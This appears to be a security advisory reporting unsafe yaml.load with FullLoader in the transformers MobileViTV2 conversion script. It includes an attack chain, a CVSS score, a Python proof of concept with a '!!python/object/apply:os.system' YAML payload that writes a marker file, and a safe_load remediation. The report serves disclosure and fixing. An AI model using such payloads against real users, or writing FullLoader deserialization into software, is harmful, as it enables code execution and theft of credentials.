# YAML Deserialization in huggingface/transformers — MobileViTV2 convert_mlcvnets_to_pytorch

## Vulnerability Type
Deserialization of Untrusted Data

## CVSS 3.1 Score
**7.8 High** — `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector | Local (malicious YAML config file) |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | Required (victim runs conversion script) |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

## Description
The `convert_mlcvnets_to_pytorch.py` conversion script in `src/transformers/models/mobilevitv2/` loads user-supplied YAML configuration files using `yaml.load(..., Loader=yaml.FullLoader)`. PyYAML's `FullLoader` permits instantiation of arbitrary Python objects via YAML tags like `!!python/object/apply:`, enabling remote code execution when processing malicious configuration files.

**Attack Chain:**
1. Attacker provides a malicious YAML config file (e.g., via GitHub gist, email, or shared drive)
2. Victim runs: `python convert_mlcvnets_to_pytorch.py --yaml_config malicious.yaml --output_dir ./out`
3. Script calls `yaml.load(yaml_file, Loader=yaml.FullLoader)` at line 57
4. YAML payload executes arbitrary Python code as the victim user

## Affected File(s)
- `src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py` — line 57

## Permalinks
1. https://github.com/huggingface/transformers/blob/main/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py#L57

## Reproduction Steps

### Step 1: Verify vulnerable code
```bash
curl -s https://raw.githubusercontent.com/huggingface/transformers/main/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py | grep -n 'FullLoader'
# Output: 57:    cfg = yaml.load(yaml_file, Loader=yaml.FullLoader)
```

### Step 2: Run the PoC
```bash
python3 poc_transformers_mobilevitv2_yaml.py --demo
```

### Step 3: Manual reproduction
```python
import yaml
import tempfile
import os

# Malicious YAML payload
yaml_content = """!!python/object/apply:os.system
- echo 'RCE_CONFIRMED' > /tmp/mobilevitv2_rce.txt
"""

with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
    f.write(yaml_content)
    yaml_path = f.name

# Exact vulnerable pattern from convert_mlcvnets_to_pytorch.py:57
with open(yaml_path, 'r') as yaml_file:
    cfg = yaml.load(yaml_file, Loader=yaml.FullLoader)
# Code has been executed
```

## PoC Script
See attached: `poc_transformers_mobilevitv2_yaml.py`
- `--demo` — demonstrates the YAML deserialization
- `--verify` — checks current GitHub source

## Impact
- **Local Code Execution** on any user who runs the ML-CVNet→PyTorch conversion with a malicious config
- **Token theft** — can steal Hugging Face tokens, AWS credentials, SSH keys
- **Supply chain risk** — malicious configs can be distributed via GitHub repos, forums, or shared drives

## Remediation
Replace:
```python
cfg = yaml.load(yaml_file, Loader=yaml.FullLoader)
```
With:
```python
cfg = yaml.safe_load(yaml_file)
```

## References
- **CVE-2024-11392** — Similar vulnerability in MobileViTV2 (this file may not have been fully patched)
- **CWE-502** — Deserialization of Untrusted Data
- Related: `parakeet/convert_nemo_to_hf.py` — same pattern, separate report (R1)

## Note
CVE-2024-11392 was previously issued for MobileViTV2, but verification of the current source shows `yaml.FullLoader` is still in use at line 57. This report confirms the vulnerability remains unpatched.
